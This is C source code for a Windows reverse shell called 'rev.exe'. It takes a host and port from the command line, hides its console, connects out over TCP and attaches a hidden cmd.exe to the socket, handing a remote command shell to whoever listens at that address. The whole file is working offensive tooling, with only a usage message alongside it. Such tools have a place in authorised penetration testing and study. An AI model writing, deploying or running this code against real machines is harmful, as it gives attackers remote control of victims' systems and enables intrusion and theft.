
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <windows.h>
#include <tchar.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

static int g_argc;
static TCHAR** g_argv;
static TCHAR g_host[32];
static TCHAR g_port_s[32];
static UINT16 g_port;

static errno_t __cdecl $_tcscpy_s(char* dest, size_t destSize, const char* src) {
    if (dest == NULL || src == NULL || destSize == 0 || destSize > RSIZE_MAX) {
        if (dest != NULL && destSize > 0) {
            dest[0] = _T('\0'); // 清空目标缓冲区
        }
        return EINVAL; // 无效参数
    }

    size_t i;
    for (i = 0; i < destSize; i++) {
        dest[i] = src[i];
        if (src[i] == _T('\0')) {
            return 0; // 成功
        }
    }

    dest[0] = _T('\0'); // 清空目标缓冲区
    return ERANGE;  // 缓冲区溢出
}

static INT32 print(PCTSTR text) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD charsWritten = 0;
    if (hConsole == INVALID_HANDLE_VALUE) {
        return (INT32)hConsole;
    }
    WriteConsole(hConsole, text, strlen(text), &charsWritten, NULL);
}

static INT32 print_help() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    TCHAR* text = NULL;
    DWORD charsWritten = 0;
    if (hConsole == INVALID_HANDLE_VALUE) {
        return (INT32)hConsole;
    }
    text = _T("Usage:\n");
    WriteConsole(hConsole, text, strlen(text), &charsWritten, NULL);
    text = _T("\trev.exe <ip> <port>\n");
    WriteConsole(hConsole, text, strlen(text), &charsWritten, NULL);
    text = _T("\trev.exe <ip>:<port>\n");
    WriteConsole(hConsole, text, strlen(text), &charsWritten, NULL);
    text = _T("\tor write connection config at end of rev.exe, such as [echo '10.10.10.10:4444' >> rev.exe]\n");
    WriteConsole(hConsole, text, strlen(text), &charsWritten, NULL);
    text = _T("\n");
    WriteConsole(hConsole, text, strlen(text), &charsWritten, NULL);
    return 0;
}

static INT32 parse_command_arguments() {
    TCHAR* start = NULL, * end = NULL, * port_start = NULL;
    BOOL overflow = FALSE;
    if (g_argc == 2) {
        // split by [:]
        start = g_argv[1];
        for (int i = 0; i < _tcslen(start); i++) {
            TCHAR ch = start[i];
            if (ch == _T(':')) {
                end = start + i;
                port_start = end + 1;
                break;
            }
        }
    }
    else if (g_argc == 3) {
        // split by [ ]
        start = g_argv[1];
        end = start + _tcslen(start);
        port_start = g_argv[2];
    }
    else {
        return -1;
    }
    ZeroMemory(g_host, sizeof(g_host));
    for (int i = 0; i < end - start; i++) {
        if (_tcslen(g_host) >= sizeof(g_host) - 1) {
            overflow = TRUE;
            break;
        }
        g_host[i] = start[i];
    }
    if (overflow) {
        return -2;
    }
    UINT64 m = 0;
    //g_port = 0;
    for (int i = 0; i < _tcslen(port_start); i++) {
        TCHAR ch = port_start[i];
        if (ch < _T('0') || ch > _T('9')) {
            return -3;
        }
        m = m * 10 + (ch - _T('0'));
    }
    if (m > 65535) {
        return -4;
    }
    g_port = (UINT16)m;
    $_tcscpy_s(g_port_s, sizeof(g_port_s), port_start);
    return 0;
}


static INT32 parse_file_arguments() {
    TCHAR buffer[64];
    TCHAR* filename = g_argv[0];
    return 0;
}

static INT32 reverse() {
    FreeConsole();
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    getaddrinfo(g_host, g_port_s, &hints, &result);
    ptr = result;
    SOCKET ConnectSocket = WSASocket(
        ptr->ai_family, 
        ptr->ai_socktype, 
        ptr->ai_protocol,
        NULL, 0, 0
    );
    connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = (HANDLE)ConnectSocket;
    si.hStdOutput = (HANDLE)ConnectSocket;
    si.hStdError = (HANDLE)ConnectSocket;
    TCHAR cmd[] = _T("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
__ERROR__:
    do {} while (0);
__FREE__:
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    WSACleanup();
    return 0;
}


int main(int argc, TCHAR* argv[], TCHAR* envp[]) {
    g_argc = argc;
    g_argv = argv;
    INT32 retCode = 0;
    for (int i = 0; i < argc; i++) {
        print(argv[i]);
    }
    if (g_argc > 1) {
        retCode = parse_command_arguments();
    }
    else {
        retCode = parse_file_arguments();
    }
    if (0 == retCode) {
        return reverse();
    }
    else {
        print_help();
        return retCode;
    }
}